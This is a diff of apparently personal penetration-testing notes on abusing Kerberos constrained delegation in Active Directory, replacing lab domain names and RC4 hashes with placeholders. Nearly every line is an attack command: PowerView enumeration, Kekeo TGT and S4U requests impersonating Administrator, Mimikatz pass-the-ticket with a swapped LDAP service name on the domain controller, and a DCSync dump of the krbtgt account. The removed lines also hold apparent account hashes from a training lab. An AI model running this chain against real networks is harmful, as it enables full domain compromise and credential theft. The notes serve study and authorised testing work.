@@ -8,7 +8,7 @@ To impersonate the user, Service for User (S4U) extension is used which provides
 
 to enum users and computers with constrained delegation enabled:
 
--PowerView_dev
+-PowerView
 
 Get-DomainUser -TrustedToAuth
 
@@ -24,28 +24,28 @@ Get-ADObject -Filter {msDS-AllowedToDelegateTo -ne "$null"} -Properties msDS-All
 
 Using asktgt from Kekeo, we request a TGT
 
-"kekeo # tgt::ask /user:websvc /domain:dollarcorp.moneycorp.local /rc4:cc098f204c5887eaa8253e7c2749156f"
+"kekeo # tgt::ask /user:usersvc /domain:subdomain.domain.local /rc4:rc4hash"
 
-"kekeo # tgs::s4u /tgt:TGT_GENERATED_FROM_EARLIER_COMMAND /user:Administrator@dollarcorp.moneycorp.local /service:cifs/dcorp-MSSQL.dolar....
+"kekeo # tgs::s4u /tgt:TGT_GENERATED_FROM_EARLIER_COMMAND /user:Administrator@subdomain.domain.local /service:cifs/subdomain-MSSQL.domain....
 
-Invoke-Mimikatz -Command '"kerberos::ptt TGS_Administrator@dollarcorp.moneycorp.local@DOLLARCORP.MONEYCORP.LOCAL_cifs~dcorp-mssql.dollarcorp.moneycorp.local@DOLLARCORP.MONEYCORP.LOCAL.kirbi"'
+Invoke-Mimikatz -Command '"kerberos::ptt TGS_Administrator@subdomain.domain.local@SUBDOMAIN.DOMAIN.LOCAL_cifs~subdomain-mssql.subdomain.domain.local@SUBDOMAIN.DOMAIN.LOCAL.kirbi"'
 
---obtained cifs/dcorp-mssql TGS
+--obtained cifs/subdomain-mssql TGS
 
 ----------------------------------------------
 
 Delegation occurs not only for the specified service but for any service running under the same account. There is no validation for the SPN specified.
 
-delegation for cifs on dcorp/mssql - can access all the services for which the user CIFS run for
+delegation for cifs on subdomain/mssql - can access all the services for which the user CIFS run for
 
-we're going to do the same for the COMPUTER with the constrained delegation Get-DomainComputer -TrustedToAuth (the user is DCORP-ADMINSRV$)
+we're going to do the same for the COMPUTER with the constrained delegation Get-DomainComputer -TrustedToAuth (the computerName is subdomain-ADMINSRV$)
 
-kekeo # tgt::ask /user:dcorp-admisrv$ /domain:dollarcorp.moneycorp.local /rc4:5e77978a734e3a7f3895fb0fdbda3b96
+kekeo # tgt::ask /user:subdomain-admisrv$ /domain:subdomain.domain.local /rc4:rc4hash
 
-kekeo # tgs::s4u /tgt:TGT_GENERATED_FROM_EARLIER_COMMAND /user:Administrator@dollarcorp.moneycorp.local /service:time/dcorp-dc.dollarcorp.moneycorp.local|ldap/dcorp-dc...)
+kekeo # tgs::s4u /tgt:TGT_GENERATED_FROM_EARLIER_COMMAND /user:Administrator@subdomain.domain.local /service:time/subdomain-dc.subdomain.domain.local|ldap/subdomain-dc...)
 
-Invoke-Mimikatz -Command '"kerberos::ptt TGS_ADministrator@dollarcorp.moneycorp.local@DOLLARCORP.MONEYCORP.LOCAL_ldap~dcorp-dc.dollarcorp.moneycorp.local@DOLLARCORP.MONEYCORP.LOCAL_ALT.kirbi
+Invoke-Mimikatz -Command '"kerberos::ptt TGS_ADministrator@subdomain.domain.local@SUBDOMAIN.DOMAIN.LOCAL_ldap~subdomain-dc.subdomain.domain.local@SUBDOMAIN.DOMAIN.LOCAL_ALT.kirbi
 
 klist
 
-Invoke-Mimikatz -Command '"lsadump::dcsync /user:dcorp\krbtgt"'
+Invoke-Mimikatz -Command '"lsadump::dcsync /user:subdomain\krbtgt"'
